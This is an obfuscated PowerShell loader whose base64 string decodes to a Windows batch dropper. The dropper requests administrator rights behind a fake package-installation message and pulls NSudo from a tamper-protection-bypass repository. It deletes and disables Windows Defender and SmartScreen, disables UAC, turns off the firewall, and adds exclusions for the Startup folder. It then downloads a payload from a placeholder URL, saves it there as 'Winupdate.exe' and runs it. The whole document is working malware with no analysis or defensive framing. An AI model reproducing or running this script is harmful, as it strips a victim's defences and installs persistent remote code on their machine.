$ Xvea5ea  =  "QGVjaG8gb2ZmCgo6OiBCYXRjaEdvdEFkbWluCjo6LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpSRU0gIC0tPiBDaGVjayBmb3IgcGVybWlzc2lvbnMKPm51bCAyPiYxICIlU1lTVEVNUk9PVCVcc3lzdGVtMzJcY2FjbHMuZXhlIiAiJVNZU1RFTVJPT1QlXHN5c3RlbTMyXGNvbmZpZ1xzeXN0ZW0iCgpSRU0gLS0+IElmIGVycm9yIGZsYWcgc2V0LCB3ZSBkbyBub3QgaGF2ZSBhZG1pbi4KaWYgJyVlcnJvcmxldmVsJScgTkVRICcwJyAoCiAgICBlY2hvIFJlcXVlc3RpbmcgYWRtaW5pc3RyYXRpdmUgcHJpdmlsZWdlcy4uLgogICAgZ290byBVQUNQcm9tcHQKKSBlbHNlICggZ290byBnb3RBZG1pbiApCgo6VUFDUHJvbXB0CiAgICBlY2hvIFNldCBVQUMgPSBDcmVhdGVPYmplY3ReKCJTaGVsbC5BcHBsaWNhdGlvbiJeKSA+ICIldGVtcCVcZ2V0YWRtaW4udmJzIgogICAgc2V0IHBhcmFtcyA9ICUqOiI9IgogICAgZWNobyBVQUMuU2hlbGxFeGVjdXRlICJjbWQuZXhlIiwgIi9jICV+czAgJXBhcmFtcyUiLCAiIiwgInJ1bmFzIiwgMSA+PiAiJXRlbXAlXGdldGFkbWluLnZicyIKCiAgICAiJXRlbXAlXGdldGFkbWluLnZicyIKICAgIGRlbCAiJXRlbXAlXGdldGFkbWluLnZicyIKICAgIGV4aXQgL0IKCjpnb3RBZG1pbgplY2hvIG1zZ2JveCAiUGxlYXNlIFdhaXQgV2hpbGUgd2UgaW5zdGFsbCBuZWNlc3NhcnkgcGFja2FnZXMgZm9yIFlvdSEuV2luZG93IHdpbGwgYmUgY2xvc2VkIGFmdGVyIEluc3RhbGxhdGlvbiEhISEiID4gJXRtcCVcdG1wLnZicwp3c2NyaXB0ICV0bXAlXHRtcC52YnMKZGVsICV0bXAlXHRtcC52YnMKCmVjaG8gIEluc3RhbGxpbmcgTmVjZXNzYXJ5IFBhY2thZ2VzLi4uLi5QbGVhc2UgV2FpdC4uLi4uLi4KCmNkICAldGVtcCUKCnNldCBjMWMyYzNjNGM1YzY9Yml0cwoKc2V0IGMxYzJjM2M0YzVjNmM3PWFkbWluCgolYzFjMmMzYzRjNWM2JSVjMWMyYzNjNGM1YzZjNyUvdHJhbnNmZXIgRXhwbG9yZXJzIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc3dhZ2thcm5hL0J5cGFzcy1UYW1wZXItUHJvdGVjdGlvbi9tYWluL05TdWRvLmV4ZSAldGVtcCVcTlN1ZG8uZXhlCgpzZXQgcG9wPSVzeXN0ZW1yb290JQoKTlN1ZG8gLVU6VCAtU2hvd1dpbmRvd01vZGU6SGlkZSBpY2FjbHMgIiVwb3AlXFN5c3RlbTMyXHNtYXJ0c2NyZWVuLmV4ZSIgL2luaGVyaXRhbmNlOnIgL3JlbW92ZSAqUy0xLTUtMzItNTQ0ICpTLTEtNS0xMSAqUy0xLTUtMzItNTQ1ICpTLTEtNS0xOAoKTlN1ZG8gLVU6VCByZWcgYWRkICJIS0xNXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFVYIENvbmZpZ3VyYXRpb24iICAvdiAiTm90aWZpY2F0aW9uX1N1cHByZXNzIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mCiAKTlN1ZG8gLVU6VCAtU2hvd1dpbmRvd01vZGU6SGlkZSAgc2MgZGVsZXRlICB3aW5kZWZlbmQgIAoKcG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4dGVuc2lvbiAiLmJhdCIiCgpwb3dlcnNoZWxsLmV4ZSAtY29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uRXh0ZW5zaW9uICIuZXhlIiIKCnBvd2Vyc2hlbGwgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnIiVVU0VSUFJPRklMRSVcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cCciCgpwb3dlcnNoZWxsLmV4ZSBOZXctSXRlbVByb3BlcnR5IC1QYXRoIEhLTE06U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25ccG9saWNpZXNcc3lzdGVtIC1OYW1lIEVuYWJsZUxVQSAtUHJvcGVydHlUeXBlIERXb3JkIC1WYWx1ZSAwIC1Gb3JjZQoKcG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgIlNldC1NcFByZWZlcmVuY2UgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQiCgpwb3dlcnNoZWxsLmV4ZSAtY29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtUFVBUHJvdGVjdGlvbiBkaXNhYmxlIgoKCnBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1TaWduYXR1cmVEaXNhYmxlVXBkYXRlT25TdGFydHVwV2l0aG91dEVuZ2luZSAkdHJ1ZSIKcG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgIlNldC1NcFByZWZlcmVuY2UgLURpc2FibGVBcmNoaXZlU2Nhbm5pbmcgJHRydWUiCgpwb3dlcnNoZWxsLmV4ZSAtY29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUiCnBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUiCnBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyIgoKcG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgIlNldC1NcFByZWZlcmVuY2UgLUhpZ2hUaHJlYXREZWZhdWx0QWN0aW9uIDYgLUZvcmNlIgpwb3dlcnNoZWxsLmV4ZSAtY29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtTW9kZXJhdGVUaHJlYXREZWZhdWx0QWN0aW9uIDYiCiAgICAgIApwb3dlcnNoZWxsLmV4ZSAtY29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtTG93VGhyZWF0RGVmYXVsdEFjdGlvbiA2IgoKcG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgIlNldC1NcFByZWZlcmVuY2UgLVNldmVyZVRocmVhdERlZmF1bHRBY3Rpb24gNiIKCnBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1TY2FuU2NoZWR1bGVEYXkgOCIKCnBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJuZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb2ZmIgoKCmNkICIlVVNFUlBST0ZJTEUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAKCnBvd2Vyc2hlbGwgLWNvbW1hbmQgInN0YXJ0LWJpdHN0cmFuc2ZlciBodHRwczovL2RpcmVjdC11cmwtZm9yLXBheWxvYWQveHh4LmV4ZSAgIC5cV2ludXBkYXRlLmV4ZSIKCnN0YXJ0ICBXaW51cGRhdGUuZXhlCg=="


$B35ezqez = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($Xvea5ea))

:
$aze2azve = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($B35ezqez))

powershell -EncodedCommand $aze2azve
